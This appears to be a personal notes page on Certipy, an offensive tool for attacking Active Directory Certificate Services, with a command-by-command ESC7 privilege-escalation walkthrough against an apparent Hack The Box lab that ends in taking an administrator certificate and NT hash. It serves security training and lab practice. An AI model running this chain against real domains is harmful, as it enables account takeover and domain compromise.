# About
[Certipy](https://github.com/ly4k/Certipy) is a tool for Active Directory Certificate Services enumeration and abuse. It's is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). If you're not familiar with AD CS and the various domain escalation techniques, from the github, a good resource is: [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2) by [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin_).
## Links
[Certipy Github](https://github.com/ly4k/Certipy)
# Installing
Install reqs
```
sudo apt update && sudo apt install -y python3 python3-pip
```

From within a Virtual Envrionment(venv)
```
pip install certipy-ad
```

# Usage
**Enumerate AD CS** - The attacker runs `certipy find` to discover any vulnerable configurations:
```shell
certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip 'DC-IP' -text -enabled -hide-admins
```

Dump all CAs and Templates
```
certipy find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip 'DC-IP'
```

ESC1 - write pfx file
```
certipy req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip 'DC-IP' -target "TARGET_CA_DNS" -ca "CA_NAME" -template "TEMPLATE" -upn "TARGET_USER_AT_DOMAIN_COM" -sid "TARGET_USER_SID" -key-size 4096
```

ESC1 - Authenticate with pfx file
```
certipy auth -pfx "PFX_FILE_NAME" -dc-ip "DC-IP"
```
# Usage
We can use the `find` argument to enumerate AD CS certificate templates, certificate authorities and other configurations and with `-vulnerable` it can show us what "ESC#"(Escalation number, for a full list, checkout the Github they are vulnerable to. In this example, it's Vulnable to ESC7, which is when a user has the `Manage CA` or `Manage Certificates` access right on a CA.

```
certipy-ad find -vulnerable -u raven@dc01.manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.139.52 -stdout
```

![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FHhB5fYLAkA0k0Ym1lqsb%252Fimage.png%3Falt%3Dmedia%26token%3D08e55e46-7162-4b06-8a85-47d96cffcd72&width=768&dpr=4&quality=100&sign=29f9884e&sv=2)

So in this example we have Ravens credentials and can upgrade her account to have additional permissions. If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.

```
certipy-ad ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

The `SubCA` template can be enabled on the CA with the `-enable-template` parameter. By default, the `SubCA` template is enabled.

```
certipy-ad ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FmYZ7E68rShUhiV0qUG1n%252Fimage.png%3Falt%3Dmedia%26token%3De296b3cc-14f9-461e-a4e2-071a0eae7141&width=768&dpr=4&quality=100&sign=3fc4c421&sv=2)

If we have fulfilled the prerequisites for this attack, we can start by requesting a certificate based on the `SubCA` template. This request will be denied, but we will save the private key and note down the request ID. With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

```
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -template SubCA -upn administrator@manager.htb
```

![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FK8gcqQtIMfhhhtUdg7bB%252Fimage.png%3Falt%3Dmedia%26token%3D9ff7fc58-5022-4988-afc6-08fad0b29733&width=768&dpr=4&quality=100&sign=38485cfb&sv=2)

With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.

```
certipy-ad ca -ca 'manager-DC01-CA' -issue-request 17 -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123'
```

![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FinhyW4HbkCTQP05QVDQ0%252Fimage.png%3Falt%3Dmedia%26token%3D93ab9a4d-946a-4e73-869a-aa01da86eb32&width=768&dpr=4&quality=100&sign=f00f230d&sv=2)

And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.

```
certipy-ad req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca manager-DC01-CA -target dc01.manager.htb -retrieve 17
```

![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FCpFqs1Dg7hlf9WNOrqJu%252Fimage.png%3Falt%3Dmedia%26token%3Dc028dcb9-3cdf-4be3-9d33-338ee6789920&width=768&dpr=4&quality=100&sign=a5900b28&sv=2)

Now that we have the Administrator.pfx file we can obtain the admin hash using the `auth` argument. [From the github](https://github.com/ly4k/Certipy#authenticate) "The `auth` command will use either the PKINIT Kerberos extension or Schannel protocol for authentication with the provided certificate. Kerberos can be used to retrieve a TGT and the NT hash for the target user, whereas Schannel will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands. See the [blog posts](https://research.ifcr.dk/) for more information on when to use which option"

```
certipy-ad auth -pfx administrator.pfx -username 'administrator' -domain 'manager.htb' -dc-ip 10.129.139.52
```

![](https://cybersec.th4ntis.com/~gitbook/image?url=https%3A%2F%2F667808901-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FTdW22AGCceN8oUXfdlKI%252Fuploads%252FAWWUZ8I6sxR9wmkSJkiQ%252Fimage.png%3Falt%3Dmedia%26token%3Dfe8a7bde-637d-48d0-a78e-5e3dc9896f63&width=768&dpr=4&quality=100&sign=d2902424&sv=2)